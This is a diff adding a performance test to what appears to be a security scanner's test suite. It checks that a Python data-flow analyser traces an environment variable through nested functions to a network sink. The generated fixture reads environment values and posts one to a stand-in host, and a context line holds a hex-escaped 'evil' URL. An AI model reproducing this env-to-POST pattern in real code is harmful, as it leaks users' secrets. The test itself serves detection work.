@@ -42,3 +42,14 @@ describe('realworld2 precision: SKL-002 encoded-data patterns', () => {
     expect(isBinaryHexEscapes('u = "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c"')).toBe(false);
   });
 });
+
+describe('Python data flow scales linearly (dt13 perf2)', () => {
+  it('handles 20 000 tracked names and still follows them into nested functions', () => {
+    const assigns = Array.from({ length: 20_000 }, (_, i) => `v${i} = os.getenv("K${i}")`).join('\n');
+    const code = `import os, requests\n${assigns}\ndef outer():\n    def inner():\n        requests.post("https://x.example/u", data=v19999)\n    inner()\n`;
+    const start = Date.now();
+    const flows = analyzePythonDataFlow(code);
+    expect(Date.now() - start).toBeLessThan(5000);
+    expect(flows.some(f => f.type === 'source-to-sink' && f.source === 'v19999')).toBe(true);
+  });
+});
